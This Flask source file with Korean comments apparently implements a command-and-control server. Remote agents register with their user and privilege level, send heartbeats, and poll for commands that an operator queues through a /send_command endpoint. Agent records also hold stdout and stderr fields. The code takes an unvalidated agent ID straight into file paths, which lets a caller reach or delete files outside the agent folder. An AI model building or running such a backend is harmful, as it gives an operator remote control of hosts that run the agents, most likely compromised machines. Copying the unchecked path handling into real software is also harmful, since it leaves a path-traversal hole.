from flask import Flask, request, jsonify, render_template
import os
import uuid
import json
import sys
from typing import Dict, Optional
from datetime import datetime

app = Flask(__name__)

# 상수 정의
AGENTS_DIR = "agents"  # 에이전트를 저장할 전용 디렉토리
REQUIRED_FIELDS = {'agent_name', 'user', 'privilege'}

def setup_agents_directory() -> None:
    """에이전트 디렉토리가 존재하는지 확인하고 생성합니다."""
    if not os.path.exists(AGENTS_DIR):
        os.makedirs(AGENTS_DIR)

def get_agent_path(guid: str) -> str:
    """에이전트 파일의 전체 경로를 반환합니다."""
    return os.path.join(AGENTS_DIR, f"{guid}.json")

def load_agent_data(guid: str) -> Optional[Dict]:
    """에이전트 데이터를 파일에서 로드합니다."""
    try:
        with open(get_agent_path(guid), 'r') as file:
            return json.loads(file.read())
    except (FileNotFoundError, json.JSONDecodeError):
        return None

def save_agent_data(guid: str, data: Dict) -> None:
    """에이전트 데이터를 파일에 저장합니다."""
    with open(get_agent_path(guid), 'w') as file:
        json.dump(data, file, indent=2)

def get_all_agents() -> list:
    """모든 에이전트 데이터를 로드합니다."""
    agents = []
    if os.path.exists(AGENTS_DIR):
        for filename in os.listdir(AGENTS_DIR):
            if filename.endswith('.json'):
                try:
                    with open(os.path.join(AGENTS_DIR, filename), 'r') as file:
                        agent_data = json.load(file)
                        agents.append(agent_data)
                except json.JSONDecodeError:
                    continue
    return agents

@app.route('/')
def index():
    """에이전트 목록을 HTML 형식으로 표시합니다."""
    agents = get_all_agents()
    return render_template('main.html', agents=agents)

@app.route('/command/<guid>')
def command_page(guid):
    """특정 에이전트의 명령 페이지를 표시합니다."""
    agent_data = load_agent_data(guid)
    if not agent_data:
        return "에이전트를 찾을 수 없습니다.", 404
    return render_template('command_page.html', agent=agent_data)

@app.route('/new_agent', methods=['POST'])
def new_agent():
    """새로운 에이전트를 생성합니다."""
    try:
        data = request.get_json()
        if not data or not all(field in data for field in REQUIRED_FIELDS):
            return jsonify({'error': '필수 필드가 누락되었습니다'}), 400

        agent_data = {
            'agent_name': data['agent_name'],
            'agent_user': data['user'],
            'agent_guid': str(uuid.uuid4()),
            'status': 1,
            'is_privilege': data['privilege'],
            'command': None,
            'last_seen': datetime.utcnow().isoformat(),
            'stdout' : None,
            'stderr' : None
        }

        save_agent_data(agent_data['agent_guid'], agent_data)
        return jsonify(agent_data)

    except Exception as e:
        return jsonify({'error': f'에이전트 생성 실패: {str(e)}'}), 500

@app.route('/del_agent', methods=['POST'])
def del_agent():
    """기존 에이전트를 삭제합니다."""
    try:
        data = request.get_json()
        if not data or 'agent_guid' not in data:
            return jsonify({'error': 'agent_guid가 누락되었습니다'}), 400

        agent_path = get_agent_path(data['agent_guid'])
        if not os.path.exists(agent_path):
            return jsonify({'error': '알 수 없는 에이전트입니다'}), 404

        os.remove(agent_path)
        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'error': f'에이전트 삭제 실패: {str(e)}'}), 500

@app.route('/alive', methods=['POST'])
def alive():
    """에이전트 상태와 마지막 확인 시간을 업데이트합니다."""
    try:
        data = request.get_json()
        if not data or 'agent_guid' not in data:
            return jsonify({'error': 'agent_guid가 누락되었습니다'}), 400

        agent_data = load_agent_data(data['agent_guid'])
        if not agent_data:
            return jsonify({'error': '알 수 없는 에이전트입니다'}), 404

        agent_data['status'] = 1
        agent_data['last_seen'] = datetime.utcnow().isoformat()
        save_agent_data(data['agent_guid'], agent_data)

        return jsonify(agent_data)

    except Exception as e:
        return jsonify({'error': f'에이전트 상태 업데이트 실패: {str(e)}'}), 500

@app.route('/command', methods=['POST'])
def response_command():
    """에이전트의 명령어를 조회합니다."""
    try:
        data = request.get_json()
        if not data or 'agent_guid' not in data:
            return jsonify({'error': 'agent_guid가 누락되었습니다'}), 400

        agent_data = load_agent_data(data['agent_guid'])
        if not agent_data:
            return jsonify({'error': '알 수 없는 에이전트입니다'}), 404

        return jsonify({'command': agent_data.get('command')})

    except Exception as e:
        return jsonify({'error': f'명령어 조회 실패: {str(e)}'}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    """에이전트에 명령을 전송합니다."""
    try:
        data = request.get_json()
        if not data or 'agent_guid' not in data or 'command' not in data:
            return jsonify({'error': '필수 데이터가 누락되었습니다'}), 400

        agent_data = load_agent_data(data['agent_guid'])
        if not agent_data:
            return jsonify({'error': '에이전트를 찾을 수 없습니다'}), 404

        agent_data['command'] = data['command']
        agent_data['status'] = 2  # 명령 실행 상태로 변경
        save_agent_data(data['agent_guid'], agent_data)

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'error': f'명령 전송 실패: {str(e)}'}), 500

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("사용법: python script.py <host> <port>")
        sys.exit(1)
    
    try:
        port = int(sys.argv[2])
        setup_agents_directory()
        app.run(host=sys.argv[1], port=port)
    except ValueError:
        print("포트는 숫자여야 합니다")
        sys.exit(1)